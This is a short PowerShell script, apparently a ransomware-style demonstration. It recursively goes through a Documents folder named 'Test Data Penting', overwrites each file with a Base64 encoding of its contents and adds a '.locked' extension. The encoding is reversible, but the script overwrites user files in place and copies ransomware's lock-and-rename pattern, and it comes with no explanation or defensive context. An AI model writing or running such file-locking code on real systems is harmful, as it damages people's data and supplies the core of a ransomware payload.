Get-ChildItem -Path “$Home\Documents\Test Data Penting” -Recurse | ForEach-Object {

$Content = Get-Content $_.FullName -Raw

$Bytes = [System.Text.Encoding]::UTF8.GetBytes($Content)

$Encoded = [Convert]::ToBase64String($Bytes)

Set-Content -Path $_.FullName -Value $Encoded

Rename-Item -Path $_.FullName -NewName ($_.Name + “.locked”)

} 